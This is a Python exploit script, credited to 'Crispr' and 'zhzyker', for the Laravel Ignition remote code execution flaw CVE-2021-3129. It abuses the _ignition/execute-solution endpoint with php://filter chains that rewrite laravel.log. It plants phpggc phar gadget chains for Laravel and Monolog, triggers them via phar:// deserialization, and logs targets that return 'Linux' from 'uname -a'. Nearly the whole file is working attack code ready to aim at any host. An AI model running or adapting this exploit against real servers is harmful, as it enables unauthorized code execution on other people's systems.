# -*- coding=utf-8 -*-
# Author : Crispr
# Alter: zhzyker
import os
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from http.client import HTTPConnection, HTTPSConnection
import re

PURPLE    = '\033[95m'
CYAN      = '\033[96m'
DARKCYAN  = '\033[36m'
BLUE      = '\033[94m'
GREEN     = '\033[92m'
YELLOW    = '\033[93m'
RED       = '\033[91m'
BOLD      = '\033[1m'
UNDERLINE = '\033[4m'
END       = '\033[0m'

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class EXP:
    #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用
    __gadget_chains = {
        "Laravel/RCE1":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE2":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE3":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE4":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE5":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('uname -a');" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE6":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system('uname -a');" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Laravel/RCE7":r"""
         php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE1":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE2":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE3":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
        "Monolog/RCE4":r"""
         php -d "phar.readonly=0" ./phpggc Monolog/RCE4 "uname -a" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
        """,
    }

    def __vul_check(self):
        header = {
            "Accept": "application/json",
            "Accept": "*/*"
        }
        res = requests.get(self.__url, headers=header, verify=False, timeout=20)
        if res.status_code != 405 and "laravel" not in res.text:
            print("[+] Vulnerability does not exist")
            return False
        return True

    def __payload_send(self,payload):
        header = {
            "Accept": "application/json",
            "Accept": "*/*",
            "Location": self.target
        }

        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload

        #print(data)
        res = requests.post(self.__url, headers=header, json=data, verify=False, timeout=10)
        return res

    def __clear_log(self):
        payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        return self.__payload_send(payload=payload)

    def __generate_payload(self,gadget_chain):
        generate_exp = self.__gadget_chains[gadget_chain]
        #print(generate_exp)
        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'
        print("[+] exploit:")
        #print(exp)
        return exp

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar://../storage/logs/laravel.log/tesst.txt")

    def __rce(self):
        text = str(self.__unserialize_log().text)
        #print(text)
        text = text[text.index(']'):].replace("}","").replace("]","")
        if "Linux" in text:
          regex_pattern = "Linux"
          matches = re.findall(regex_pattern, text)
          for match in matches:
            print(f"{GREEN}" + match)
            f = open("result.txt", "a")
            f.write("\n" + self.target + " => " + match)
            f.close
            break
        else:
          text = str(self.__unserialize_log().text)
          text = text[text.index(']'):].replace("}","").replace("]","")
          if "local IP address" in text:
              regex_pattern = "Solutions can only be executed by requests from a local IP address"
              matches = re.findall(regex_pattern, text)
              for match in matches:
                print(f"{RED}[-] NOT VULN! | Response : " + match)
          else:
              if "404" in text:
                  print(f"{RED}[-] %s => notfound-404" % (sys.argv[1]))
              else:
                  if "Runnable solutions are disabled in non-local environments. Please make sure `APP_ENV` is set correctly" in text:
                      print(f"{RED}[-] %s =>  Runnable solutions are disabled in non-local environments. Please make sure `APP_ENV` is set correctly" % (sys.argv[1]))
                  else:
                    if "Captcha" in text:
                        print(f"{RED}[-] %s => CAPTCHA :(" % (sys.argv[1]))
                    else:
                        if "Solutions cannot be run from your current IP address" in text:
                            print(f"{RED}[-] %s => Solutions cannot be run from your current IP address." % (sys.argv[1]))
                        else:
                            print(f"{RED}[*] NOT VULN!{END}")
                            print(text)
      #  return text

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
            print(f"{CYAN}[+] Try Exploit [%s]" % (self.target))
            print(f"{CYAN}[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('A' * 2)
            self.__payload_send(self.__generate_payload((gadget_chain)))
            self.__decode_log()
            print("[*] " + gadget_chain + " Result:")
            print(self.__rce())

    def __init__(self, target):
        self.target = target
       # self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")

        
        if not self.__vul_check():
            print(f"{RED}[-] [%s] is seems not vulnerable." % (self.target))
            print(f"{RED}[*] You can also call obj.exp() to force an attack.")
        else:
            self.exp()

def main():
    EXP(https)

if __name__ == "__main__":
    def check_https_url(target):
        HTTPS_URL = f'https://{target}'
        try:
            HTTPS_URL = urlparse(HTTPS_URL)
            connection = HTTPSConnection(HTTPS_URL.netloc, timeout=30)
            connection.request('HEAD', HTTPS_URL.path)
            if connection.getresponse():
                return True
            else:
                return False
        except:
            return False

    def check_http_url(target):
        HTTP_URL = f'http://{target}'
        try:
            HTTP_URL = urlparse(HTTP_URL)
            connection = HTTPConnection(HTTP_URL.netloc)
            connection.request('HEAD', HTTP_URL.path)
            if connection.getresponse():
                return True
            else:
                return False
        except:
            return False
        
    if check_https_url(sys.argv[1]):
        print("[+] Nice, you can load the website with HTTPS")
        https = "https://" + sys.argv[1]
        main()
    elif check_http_url(sys.argv[1]):
        print("[*] HTTPS didn't load the website, but you can use HTTP")
        https = "http://" + sys.argv[1]
        main()
    else:
        print("[-] %s => Server Error" % (sys.argv[1]))